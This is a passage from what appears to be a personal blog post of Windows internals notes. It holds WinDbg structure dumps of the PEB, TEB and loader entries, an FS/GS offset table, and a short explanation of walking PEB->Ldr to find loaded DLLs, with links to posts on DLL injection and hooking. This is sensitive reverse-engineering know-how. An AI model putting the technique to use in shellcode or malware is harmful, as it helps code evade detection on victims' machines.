   <span class="token operator">+</span>0x088 ReadOnlySharedMemoryBase : Ptr64 Void
   <span class="token operator">+</span>0x090 SharedData       : Ptr64 Void
   <span class="token operator">+</span>0x098 ReadOnlyStaticServerData : Ptr64 Ptr64 Void
   <span class="token operator">+</span>0x0a0 AnsiCodePageData : Ptr64 Void
   <span class="token operator">+</span>0x0a8 OemCodePageData  : Ptr64 Void
   <span class="token operator">+</span>0x0b0 UnicodeCaseTableData : Ptr64 Void
   <span class="token operator">+</span>0x0b8 NumberOfProcessors : Uint4B
   <span class="token operator">+</span>0x0bc NtGlobalFlag     : Uint4B
   <span class="token operator">+</span>0x0c0 CriticalSectionTimeout : _LARGE_INTEGER
   <span class="token operator">+</span>0x0c8 HeapSegmentReserve : Uint8B
   <span class="token operator">+</span>0x0d0 HeapSegmentCommit : Uint8B
   <span class="token operator">+</span>0x0d8 HeapDeCommitTotalFreeThreshold : Uint8B
   <span class="token operator">+</span>0x0e0 HeapDeCommitFreeBlockThreshold : Uint8B
   <span class="token operator">+</span>0x0e8 NumberOfHeaps    : Uint4B
   <span class="token operator">+</span>0x0ec MaximumNumberOfHeaps : Uint4B
   <span class="token operator">+</span>0x0f0 ProcessHeaps     : Ptr64 Ptr64 Void
   <span class="token operator">+</span>0x0f8 GdiSharedHandleTable : Ptr64 Void
   <span class="token operator">+</span>0x100 ProcessStarterHelper : Ptr64 Void
   <span class="token operator">+</span>0x108 GdiDCAttributeList : Uint4B
   <span class="token operator">+</span>0x10c Padding3         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x110 LoaderLock       : Ptr64 _RTL_CRITICAL_SECTION
   <span class="token operator">+</span>0x118 OSMajorVersion   : Uint4B
   <span class="token operator">+</span>0x11c OSMinorVersion   : Uint4B
   <span class="token operator">+</span>0x120 OSBuildNumber    : Uint2B
   <span class="token operator">+</span>0x122 OSCSDVersion     : Uint2B
   <span class="token operator">+</span>0x124 OSPlatformId     : Uint4B
   <span class="token operator">+</span>0x128 ImageSubsystem   : Uint4B
   <span class="token operator">+</span>0x12c ImageSubsystemMajorVersion : Uint4B
   <span class="token operator">+</span>0x130 ImageSubsystemMinorVersion : Uint4B
   <span class="token operator">+</span>0x134 Padding4         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x138 ActiveProcessAffinityMask : Uint8B
   <span class="token operator">+</span>0x140 GdiHandleBuffer  : <span class="token punctuation">[</span>60<span class="token punctuation">]</span> Uint4B
   <span class="token operator">+</span>0x230 PostProcessInitRoutine : Ptr64     void 
   <span class="token operator">+</span>0x238 TlsExpansionBitmap : Ptr64 _RTL_BITMAP
   <span class="token operator">+</span>0x240 TlsExpansionBitmapBits : <span class="token punctuation">[</span>32<span class="token punctuation">]</span> Uint4B
   <span class="token operator">+</span>0x2c0 SessionId        : Uint4B
   <span class="token operator">+</span>0x2c4 Padding5         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x2c8 AppCompatFlags   : _ULARGE_INTEGER
   <span class="token operator">+</span>0x2d0 AppCompatFlagsUser : _ULARGE_INTEGER
   <span class="token operator">+</span>0x2d8 pShimData        : Ptr64 Void
   <span class="token operator">+</span>0x2e0 AppCompatInfo    : Ptr64 Void
   <span class="token operator">+</span>0x2e8 CSDVersion       : _UNICODE_STRING
   <span class="token operator">+</span>0x2f8 ActivationContextData : Ptr64 _ACTIVATION_CONTEXT_DATA
   <span class="token operator">+</span>0x300 ProcessAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP
   <span class="token operator">+</span>0x308 SystemDefaultActivationContextData : Ptr64 _ACTIVATION_CONTEXT_DATA
   <span class="token operator">+</span>0x310 SystemAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP
   <span class="token operator">+</span>0x318 MinimumStackCommit : Uint8B
   <span class="token operator">+</span>0x320 SparePointers    : <span class="token punctuation">[</span>2<span class="token punctuation">]</span> Ptr64 Void
   <span class="token operator">+</span>0x330 PatchLoaderData  : Ptr64 Void
   <span class="token operator">+</span>0x338 ChpeV2ProcessInfo : Ptr64 _CHPEV2_PROCESS_INFO
   <span class="token operator">+</span>0x340 AppModelFeatureState : Uint4B
   <span class="token operator">+</span>0x344 SpareUlongs      : <span class="token punctuation">[</span>2<span class="token punctuation">]</span> Uint4B
   <span class="token operator">+</span>0x34c ActiveCodePage   : Uint2B
   <span class="token operator">+</span>0x34e OemCodePage      : Uint2B
   <span class="token operator">+</span>0x350 UseCaseMapping   : Uint2B
   <span class="token operator">+</span>0x352 UnusedNlsField   : Uint2B
   <span class="token operator">+</span>0x358 WerRegistrationData : Ptr64 Void
   <span class="token operator">+</span>0x360 WerShipAssertPtr : Ptr64 Void
   <span class="token operator">+</span>0x368 EcCodeBitMap     : Ptr64 Void
   <span class="token operator">+</span>0x370 pImageHeaderHash : Ptr64 Void
   <span class="token operator">+</span>0x378 TracingFlags     : Uint4B
   <span class="token operator">+</span>0x378 HeapTracingEnabled : Pos 0<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x378 CritSecTracingEnabled : Pos 1<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x378 LibLoaderTracingEnabled : Pos 2<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x378 SpareTracingBits : Pos 3<span class="token punctuation">,</span> 29 Bits
   <span class="token operator">+</span>0x37c Padding6         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x380 CsrServerReadOnlySharedMemoryBase : Uint8B
   <span class="token operator">+</span>0x388 TppWorkerpListLock : Uint8B
   <span class="token operator">+</span>0x390 TppWorkerpList   : _LIST_ENTRY
   <span class="token operator">+</span>0x3a0 WaitOnAddressHashTable : <span class="token punctuation">[</span>128<span class="token punctuation">]</span> Ptr64 Void
   <span class="token operator">+</span>0x7a0 TelemetryCoverageHeader : Ptr64 Void
   <span class="token operator">+</span>0x7a8 CloudFileFlags   : Uint4B
   <span class="token operator">+</span>0x7ac CloudFileDiagFlags : Uint4B
   <span class="token operator">+</span>0x7b0 PlaceholderCompatibilityMode : Char
   <span class="token operator">+</span>0x7b1 PlaceholderCompatibilityModeReserved : <span class="token punctuation">[</span>7<span class="token punctuation">]</span> Char
   <span class="token operator">+</span>0x7b8 LeapSecondData   : Ptr64 _LEAP_SECOND_DATA
   <span class="token operator">+</span>0x7c0 LeapSecondFlags  : Uint4B
   <span class="token operator">+</span>0x7c0 SixtySecondEnabled : Pos 0<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x7c0 Reserved         : Pos 1<span class="token punctuation">,</span> 31 Bits
   <span class="token operator">+</span>0x7c4 NtGlobalFlag2    : Uint4B
   <span class="token operator">+</span>0x7c8 ExtendedFeatureDisableMask : Uint8B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="TEB"><a href="#TEB" class="headerlink" title="_TEB"></a>_TEB</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">0:000> dt _TEB
ntdll!_TEB
   <span class="token operator">+</span>0x000 NtTib            : _NT_TIB
   <span class="token operator">+</span>0x038 EnvironmentPointer : Ptr64 Void
   <span class="token operator">+</span>0x040 ClientId         : _CLIENT_ID
   <span class="token operator">+</span>0x050 ActiveRpcHandle  : Ptr64 Void
   <span class="token operator">+</span>0x058 ThreadLocalStoragePointer : Ptr64 Void
   <span class="token operator">+</span>0x060 ProcessEnvironmentBlock : Ptr64 _PEB
   <span class="token operator">+</span>0x068 LastErrorValue   : Uint4B
   <span class="token operator">+</span>0x06c CountOfOwnedCriticalSections : Uint4B
   <span class="token operator">+</span>0x070 CsrClientThread  : Ptr64 Void
   <span class="token operator">+</span>0x078 Win32ThreadInfo  : Ptr64 Void
   <span class="token operator">+</span>0x080 User32Reserved   : <span class="token punctuation">[</span>26<span class="token punctuation">]</span> Uint4B
   <span class="token operator">+</span>0x0e8 UserReserved     : <span class="token punctuation">[</span>5<span class="token punctuation">]</span> Uint4B
   <span class="token operator">+</span>0x100 WOW32Reserved    : Ptr64 Void
   <span class="token operator">+</span>0x108 CurrentLocale    : Uint4B
   <span class="token operator">+</span>0x10c FpSoftwareStatusRegister : Uint4B
   <span class="token operator">+</span>0x110 ReservedForDebuggerInstrumentation : <span class="token punctuation">[</span>16<span class="token punctuation">]</span> Ptr64 Void
   <span class="token operator">+</span>0x190 SystemReserved1  : <span class="token punctuation">[</span>30<span class="token punctuation">]</span> Ptr64 Void
   <span class="token operator">+</span>0x280 PlaceholderCompatibilityMode : Char
   <span class="token operator">+</span>0x281 PlaceholderHydrationAlwaysExplicit : UChar
   <span class="token operator">+</span>0x282 PlaceholderReserved : <span class="token punctuation">[</span>10<span class="token punctuation">]</span> Char
   <span class="token operator">+</span>0x28c ProxiedProcessId : Uint4B
   <span class="token operator">+</span>0x290 _ActivationStack : _ACTIVATION_CONTEXT_STACK
   <span class="token operator">+</span>0x2b8 WorkingOnBehalfTicket : <span class="token punctuation">[</span>8<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x2c0 ExceptionCode    : Int4B
   <span class="token operator">+</span>0x2c4 Padding0         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x2c8 ActivationContextStackPointer : Ptr64 _ACTIVATION_CONTEXT_STACK
   <span class="token operator">+</span>0x2d0 InstrumentationCallbackSp : Uint8B
   <span class="token operator">+</span>0x2d8 InstrumentationCallbackPreviousPc : Uint8B
   <span class="token operator">+</span>0x2e0 InstrumentationCallbackPreviousSp : Uint8B
   <span class="token operator">+</span>0x2e8 TxFsContext      : Uint4B
   <span class="token operator">+</span>0x2ec InstrumentationCallbackDisabled : UChar
   <span class="token operator">+</span>0x2ed UnalignedLoadStoreExceptions : UChar
   <span class="token operator">+</span>0x2ee Padding1         : <span class="token punctuation">[</span>2<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x2f0 GdiTebBatch      : _GDI_TEB_BATCH
   <span class="token operator">+</span>0x7d8 RealClientId     : _CLIENT_ID
   <span class="token operator">+</span>0x7e8 GdiCachedProcessHandle : Ptr64 Void
   <span class="token operator">+</span>0x7f0 GdiClientPID     : Uint4B
   <span class="token operator">+</span>0x7f4 GdiClientTID     : Uint4B
   <span class="token operator">+</span>0x7f8 GdiThreadLocalInfo : Ptr64 Void
   <span class="token operator">+</span>0x800 Win32ClientInfo  : <span class="token punctuation">[</span>62<span class="token punctuation">]</span> Uint8B
   <span class="token operator">+</span>0x9f0 glDispatchTable  : <span class="token punctuation">[</span>233<span class="token punctuation">]</span> Ptr64 Void
   <span class="token operator">+</span>0x1138 glReserved1      : <span class="token punctuation">[</span>29<span class="token punctuation">]</span> Uint8B
   <span class="token operator">+</span>0x1220 glReserved2      : Ptr64 Void
   <span class="token operator">+</span>0x1228 glSectionInfo    : Ptr64 Void
   <span class="token operator">+</span>0x1230 glSection        : Ptr64 Void
   <span class="token operator">+</span>0x1238 glTable          : Ptr64 Void
   <span class="token operator">+</span>0x1240 glCurrentRC      : Ptr64 Void
   <span class="token operator">+</span>0x1248 glContext        : Ptr64 Void
   <span class="token operator">+</span>0x1250 LastStatusValue  : Uint4B
   <span class="token operator">+</span>0x1254 Padding2         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x1258 StaticUnicodeString : _UNICODE_STRING
   <span class="token operator">+</span>0x1268 StaticUnicodeBuffer : <span class="token punctuation">[</span>261<span class="token punctuation">]</span> Wchar
   <span class="token operator">+</span>0x1472 Padding3         : <span class="token punctuation">[</span>6<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x1478 DeallocationStack : Ptr64 Void
   <span class="token operator">+</span>0x1480 TlsSlots         : <span class="token punctuation">[</span>64<span class="token punctuation">]</span> Ptr64 Void
   <span class="token operator">+</span>0x1680 TlsLinks         : _LIST_ENTRY
   <span class="token operator">+</span>0x1690 Vdm              : Ptr64 Void
   <span class="token operator">+</span>0x1698 ReservedForNtRpc : Ptr64 Void
   <span class="token operator">+</span>0x16a0 DbgSsReserved    : <span class="token punctuation">[</span>2<span class="token punctuation">]</span> Ptr64 Void
   <span class="token operator">+</span>0x16b0 HardErrorMode    : Uint4B
   <span class="token operator">+</span>0x16b4 Padding4         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x16b8 Instrumentation  : <span class="token punctuation">[</span>11<span class="token punctuation">]</span> Ptr64 Void
   <span class="token operator">+</span>0x1710 ActivityId       : _GUID
   <span class="token operator">+</span>0x1720 SubProcessTag    : Ptr64 Void
   <span class="token operator">+</span>0x1728 PerflibData      : Ptr64 Void
   <span class="token operator">+</span>0x1730 EtwTraceData     : Ptr64 Void
   <span class="token operator">+</span>0x1738 WinSockData      : Ptr64 Void
   <span class="token operator">+</span>0x1740 GdiBatchCount    : Uint4B
   <span class="token operator">+</span>0x1744 CurrentIdealProcessor : _PROCESSOR_NUMBER
   <span class="token operator">+</span>0x1744 IdealProcessorValue : Uint4B
   <span class="token operator">+</span>0x1744 ReservedPad0     : UChar
   <span class="token operator">+</span>0x1745 ReservedPad1     : UChar
   <span class="token operator">+</span>0x1746 ReservedPad2     : UChar
   <span class="token operator">+</span>0x1747 IdealProcessor   : UChar
   <span class="token operator">+</span>0x1748 GuaranteedStackBytes : Uint4B
   <span class="token operator">+</span>0x174c Padding5         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x1750 ReservedForPerf  : Ptr64 Void
   <span class="token operator">+</span>0x1758 ReservedForOle   : Ptr64 Void
   <span class="token operator">+</span>0x1760 WaitingOnLoaderLock : Uint4B
   <span class="token operator">+</span>0x1764 Padding6         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x1768 SavedPriorityState : Ptr64 Void
   <span class="token operator">+</span>0x1770 ReservedForCodeCoverage : Uint8B
   <span class="token operator">+</span>0x1778 ThreadPoolData   : Ptr64 Void
   <span class="token operator">+</span>0x1780 TlsExpansionSlots : Ptr64 Ptr64 Void
   <span class="token operator">+</span>0x1788 ChpeV2CpuAreaInfo : Ptr64 _CHPEV2_CPUAREA_INFO
   <span class="token operator">+</span>0x1790 Unused           : Ptr64 Void
   <span class="token operator">+</span>0x1798 MuiGeneration    : Uint4B
   <span class="token operator">+</span>0x179c IsImpersonating  : Uint4B
   <span class="token operator">+</span>0x17a0 NlsCache         : Ptr64 Void
   <span class="token operator">+</span>0x17a8 pShimData        : Ptr64 Void
   <span class="token operator">+</span>0x17b0 HeapData         : Uint4B
   <span class="token operator">+</span>0x17b4 Padding7         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x17b8 CurrentTransactionHandle : Ptr64 Void
   <span class="token operator">+</span>0x17c0 ActiveFrame      : Ptr64 _TEB_ACTIVE_FRAME
   <span class="token operator">+</span>0x17c8 FlsData          : Ptr64 Void
   <span class="token operator">+</span>0x17d0 PreferredLanguages : Ptr64 Void
   <span class="token operator">+</span>0x17d8 UserPrefLanguages : Ptr64 Void
   <span class="token operator">+</span>0x17e0 MergedPrefLanguages : Ptr64 Void
   <span class="token operator">+</span>0x17e8 MuiImpersonation : Uint4B
   <span class="token operator">+</span>0x17ec CrossTebFlags    : Uint2B
   <span class="token operator">+</span>0x17ec SpareCrossTebBits : Pos 0<span class="token punctuation">,</span> 16 Bits
   <span class="token operator">+</span>0x17ee SameTebFlags     : Uint2B
   <span class="token operator">+</span>0x17ee SafeThunkCall    : Pos 0<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee InDebugPrint     : Pos 1<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee HasFiberData     : Pos 2<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee SkipThreadAttach : Pos 3<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee WerInShipAssertCode : Pos 4<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee RanProcessInit   : Pos 5<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee ClonedThread     : Pos 6<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee SuppressDebugMsg : Pos 7<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee DisableUserStackWalk : Pos 8<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee RtlExceptionAttached : Pos 9<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee InitialThread    : Pos 10<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee SessionAware     : Pos 11<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee LoadOwner        : Pos 12<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee LoaderWorker     : Pos 13<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee SkipLoaderInit   : Pos 14<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee SkipFileAPIBrokering : Pos 15<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17f0 TxnScopeEnterCallback : Ptr64 Void
   <span class="token operator">+</span>0x17f8 TxnScopeExitCallback : Ptr64 Void
   <span class="token operator">+</span>0x1800 TxnScopeContext  : Ptr64 Void
   <span class="token operator">+</span>0x1808 LockCount        : Uint4B
   <span class="token operator">+</span>0x180c WowTebOffset     : Int4B
   <span class="token operator">+</span>0x1810 ResourceRetValue : Ptr64 Void
   <span class="token operator">+</span>0x1818 ReservedForWdf   : Ptr64 Void
   <span class="token operator">+</span>0x1820 ReservedForCrt   : Uint8B
   <span class="token operator">+</span>0x1828 EffectiveContainerId : _GUID
   <span class="token operator">+</span>0x1838 LastSleepCounter : Uint8B
   <span class="token operator">+</span>0x1840 SpinCallCount    : Uint4B
   <span class="token operator">+</span>0x1844 Padding8         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x1848 ExtendedFeatureDisableMask : Uint8B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="idt"><a href="#idt" class="headerlink" title="idt"></a>idt</h3><p>(my blog idt)[<a href="https://wr-web.github.io/2021/05/22/dll_injection_hook/#IDT-interrupt-descriptor-table]">https://wr-web.github.io/2021/05/22/dll_injection_hook/#IDT-interrupt-descriptor-table]</a></p>
<h3 id="ssdt"><a href="#ssdt" class="headerlink" title="ssdt"></a>ssdt</h3><p>(my blog ssdt)[<a href="https://wr-web.github.io/2021/05/22/dll_injection_hook/#SSDT-system-service-descriptor-table]">https://wr-web.github.io/2021/05/22/dll_injection_hook/#SSDT-system-service-descriptor-table]</a></p>
<h3 id="windows-fs-gs"><a href="#windows-fs-gs" class="headerlink" title="windows fs gs"></a>windows fs gs</h3><p><a href="https://en.wikipedia.org/wiki/Win32_Thread_Information_Block">wiki fs gs register</a></p>
<table>
<thead>
<tr>
<th>pointer</th>
<th>FS:[0x00]</th>
<th>GS:[0x00]</th>
<th><a href="https://en.wikipedia.org/wiki/Windows_9x">Win9x</a> and <a href="https://en.wikipedia.org/wiki/Windows_NT">NT</a></th>
<th>Current <a href="https://en.wikipedia.org/wiki/Structured_Exception_Handling">Structured Exception Handling</a> (SEH) frameNote: the 64-bit version of Windows uses <a href="https://en.wikipedia.org/wiki/Call_stack#Unwinding">stack unwinding</a> done in <a href="https://en.wikipedia.org/wiki/Protection_ring#Supervisor_mode">kernel mode</a> instead.</th>
</tr>
</thead>
<tbody><tr>
<td>pointer</td>
<td>FS:[0x18]</td>
<td>GS:[0x30]</td>
<td>Win9x and NT</td>
<td>Linear address of TEB</td>
</tr>
<tr>
<td>pointer</td>
<td>FS:[0x30]</td>
<td>GS:[0x60]</td>
<td>NT</td>
<td>Linear address of <a href="https://en.wikipedia.org/wiki/Process_Environment_Block">Process Environment Block</a> (PEB)</td>
</tr>
<tr>
<td>pointer</td>
<td>FS:[0xC0]</td>
<td>GS:[0x100]</td>
<td>NT</td>
<td>Reserved for Wow64. Contains a pointer to FastSysCall in Wow64.</td>
</tr>
</tbody></table>
<p>通过 fs，gs 寄存器几乎可以得到进程，线程的大部分信息，通过 peb，teb</p>
<h4 id="利用-gs-获取加载的-dll-名称，地址等。"><a href="#利用-gs-获取加载的-dll-名称，地址等。" class="headerlink" title="利用 gs 获取加载的 dll 名称，地址等。"></a>利用 gs 获取加载的 dll 名称，地址等。</h4><p>读取 gs[0x60] 上的 peb 地址，再通过 peb-&gt;Ldr</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_PEB_LDR_DATA</span>
<span class="token punctuation">&#123;</span>
　ULONG Length<span class="token punctuation">;</span> <span class="token comment">// +0x00</span>
　BOOLEAN Initialized<span class="token punctuation">;</span> <span class="token comment">// +0x04</span>
　PVOID SsHandle<span class="token punctuation">;</span> <span class="token comment">// +0x08</span>
　LIST_ENTRY InLoadOrderModuleList<span class="token punctuation">;</span> <span class="token comment">// +0x0c</span>
　LIST_ENTRY InMemoryOrderModuleList<span class="token punctuation">;</span> <span class="token comment">// +0x14</span>
　LIST_ENTRY InInitializationOrderModuleList<span class="token punctuation">;</span><span class="token comment">// +0x1c</span>
<span class="token punctuation">&#125;</span> PEB_LDR_DATA<span class="token punctuation">,</span><span class="token operator">*</span>PPEB_LDR_DATA<span class="token punctuation">;</span> <span class="token comment">// +0x24</span>

<span class="token comment">// 和 linux 中的双向链表使用方法一样</span>
<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span> <span class="token operator">*</span>Flink<span class="token punctuation">;</span>
   <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span> <span class="token operator">*</span>Blink<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> LIST_ENTRY<span class="token punctuation">,</span> <span class="token operator">*</span>PLIST_ENTRY<span class="token punctuation">,</span> <span class="token operator">*</span>RESTRICTED_POINTER PRLIST_ENTRY<span class="token punctuation">;</span>

<span class="token number">0</span><span class="token operator">:</span><span class="token number">000</span><span class="token operator">></span> dt _LDR_DATA_TABLE_ENTRY
ntdll<span class="token operator">!</span>_LDR_DATA_TABLE_ENTRY
   <span class="token operator">+</span><span class="token number">0x000</span> InLoadOrderLinks <span class="token operator">:</span> _LIST_ENTRY
   <span class="token operator">+</span><span class="token number">0x010</span> InMemoryOrderLinks <span class="token operator">:</span> _LIST_ENTRY
   <span class="token operator">+</span><span class="token number">0x020</span> InInitializationOrderLinks <span class="token operator">:</span> _LIST_ENTRY
   <span class="token operator">+</span><span class="token number">0x030</span> DllBase          <span class="token operator">:</span> Ptr64 Void
   <span class="token operator">+</span><span class="token number">0x038</span> EntryPoint       <span class="token operator">:</span> Ptr64 Void
   <span class="token operator">+</span><span class="token number">0x040</span> SizeOfImage      <span class="token operator">:</span> Uint4B
   <span class="token operator">+</span><span class="token number">0x048</span> FullDllName      <span class="token operator">:</span> _UNICODE_STRING
   <span class="token operator">+</span><span class="token number">0x058</span> BaseDllName      <span class="token operator">:</span> _UNICODE_STRING
   <span class="token operator">+</span><span class="token number">0x068</span> FlagGroup        <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> UChar
   <span class="token operator">+</span><span class="token number">0x068</span> Flags            <span class="token operator">:</span> Uint4B
   <span class="token operator">+</span><span class="token number">0x068</span> PackagedBinary   <span class="token operator">:</span> Pos <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> MarkedForRemoval <span class="token operator">:</span> Pos <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ImageDll         <span class="token operator">:</span> Pos <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> LoadNotificationsSent <span class="token operator">:</span> Pos <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> TelemetryEntryProcessed <span class="token operator">:</span> Pos <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ProcessStaticImport <span class="token operator">:</span> Pos <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> InLegacyLists    <span class="token operator">:</span> Pos <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> InIndexes        <span class="token operator">:</span> Pos <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ShimDll          <span class="token operator">:</span> Pos <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> InExceptionTable <span class="token operator">:</span> Pos <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ReservedFlags1   <span class="token operator">:</span> Pos <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">2</span> Bits
   <span class="token operator">+</span><span class="token number">0x068</span> LoadInProgress   <span class="token operator">:</span> Pos <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> LoadConfigProcessed <span class="token operator">:</span> Pos <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> EntryProcessed   <span class="token operator">:</span> Pos <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ProtectDelayLoad <span class="token operator">:</span> Pos <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ReservedFlags3   <span class="token operator">:</span> Pos <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">2</span> Bits
   <span class="token operator">+</span><span class="token number">0x068</span> DontCallForThreads <span class="token operator">:</span> Pos <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ProcessAttachCalled <span class="token operator">:</span> Pos <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ProcessAttachFailed <span class="token operator">:</span> Pos <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> CorDeferredValidate <span class="token operator">:</span> Pos <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> CorImage         <span class="token operator">:</span> Pos <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> DontRelocate     <span class="token operator">:</span> Pos <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
